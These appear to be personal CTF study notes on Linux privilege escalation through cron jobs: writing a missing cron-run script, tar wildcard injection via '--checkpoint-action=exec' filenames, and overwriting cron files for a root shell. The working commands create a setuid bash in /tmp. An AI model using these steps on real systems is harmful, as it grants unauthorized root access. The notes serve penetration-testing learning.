Scheduled Tasks 

## Cron and timers overview 
* cron job
	* cat /etc/crontab
	* all '*' means that it happens every minute 
	* important, espically in CTF's where it is intentional and runs often b/c the CTF wants to be quick 
* chron timers 
* SystemD timers 
## Escaliation via chron paths 
* overwrite.sh runs every minute but the file does not exist
* echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh makes the file
* Wait a minute 
* Run /tmp/bash
* Returns root 
## Cron Wildcards
* Can also be used outside of cron
* /usr/local/bin/compress.sh
```
cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
* Can inject a script and overwrite the tar 
* Only have read access to the script 
```
* echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > fileout.sh
* touch /home/user/--checkpoint-action=exec=fileoutsh
* /tmp/bash -p 
```
* Returns root
* JUST BE LOOKING FOR A WILDCARD IN CRON
## Cron file overwrites 
* if you see a file running in a crom job then just try to overwrite it and give yourself a reverse root shell
* 